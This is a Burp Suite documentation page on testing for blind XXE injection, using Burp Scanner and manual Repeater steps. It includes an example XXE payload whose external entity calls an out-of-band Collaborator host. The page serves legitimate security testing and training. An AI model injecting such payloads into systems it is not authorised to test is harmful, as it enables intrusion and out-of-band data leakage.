# Testing for blind XXE injection vulnerabilities with Burp Suite

Source: https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/xxe-injection/blind
Fetched: 2026-06-28T09:16:01.306389+00:00

Support Center

Documentation

Desktop editions

Testing workflow

Testing for vulnerabilities

Testing input validation

XXE injection

Testing for blind XXE injection vulnerabilities

Professional

Testing for blind XXE injection vulnerabilities with Burp Suite

Last updated:

June 18, 2026

Read time:

2 Minutes

Blind XXE injection vulnerabilities occur when an application is vulnerable to XXE injection but doesn't return the values of any defined external entities within its responses. This means that direct retrieval of server-side files isn't possible.

You can use Burp to test for blind XXE injection vulnerabilities:

Professional Use Burp Scanner to automatically flag potential vulnerabilities.

Use Burp Repeater to manually inject an XXE payload that may trigger an out-of-band network interaction with the Burp Collaborator server.

Burp monitors the Collaborator server to identify whether an out-of-band interaction occurs. This indicates that the

XXE attack was successful.

Steps

You can follow this process using the Blind XXE with out-of-band interaction Web Security Academy lab.

Scanning for blind XXE injection vulnerabilities

If you're using Burp Suite Professional, you can use Burp Scanner to test for blind XXE injection vulnerabilities:

Identify a request that contains XML that you want to investigate.

In Proxy > HTTP history, right-click the request and select Do active scan. Burp Scanner audits the request.

Review the Issues tab on the Dashboard to identify any blind XXE injection issues that Burp Scanner flags.

Manually testing for blind XXE injection vulnerabilities

You can also use Burp Repeater to test for blind XXE injection vulnerabilities. This process also enables you to exploit these vulnerabilities, and closely investigate any issues that Burp Scanner has identified:

In Proxy > HTTP history, identify a request that contains XML that you want to investigate.

Right-click the request and select Send to Repeater.

Go to the Repeater tab.

Insert an XXE payload into the XML string. The payload should define an XML entity and contain a

Collaborator subdomain as a value. For example, this payload defines the entity &xxe;

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://znqs4tz5wx2vd0v03r588zsxtozfn5bu.oastify.com"> ]>

Replace a data value in the XML with your defined XML entity.

Click Send.

Go to the Collaborator tab and click Poll now. Any interactions with the Collaborator server are listed in the table. If an interaction occurs, this indicates that the XXE attack successfully triggered an interaction with the website.

Test additional XML data values by replacing a different data value in the XML with your defined XML entity.

Note

There may be a delay before any interaction with the Collaborator server occurs. The Collaborator tab flashes when an interaction occurs. Make sure that you continue to check the tab to identify any delayed interactions.

Related pages

Burp Repeater

Burp Collaborator

Academy: XML external entity (XXE) injection
